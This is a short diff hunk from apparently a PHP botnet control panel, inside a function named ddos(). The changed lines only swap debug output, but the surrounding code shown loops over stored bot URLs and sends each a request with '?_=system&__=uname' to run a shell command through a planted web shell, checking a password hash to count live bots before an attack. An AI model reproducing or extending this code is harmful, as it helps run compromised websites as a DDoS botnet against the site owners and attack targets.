@@ -765,9 +765,10 @@ function ddos() {
 	echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';
 
         } elseif($_POST['sup'] == 'attack') {
+        	echo "attack";
             $y = 0;
             while($row = mysqli_fetch_assoc($rows)) {
-	echo "Ciao";
+	
 $source = conn($row['url'].'?_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $y++;
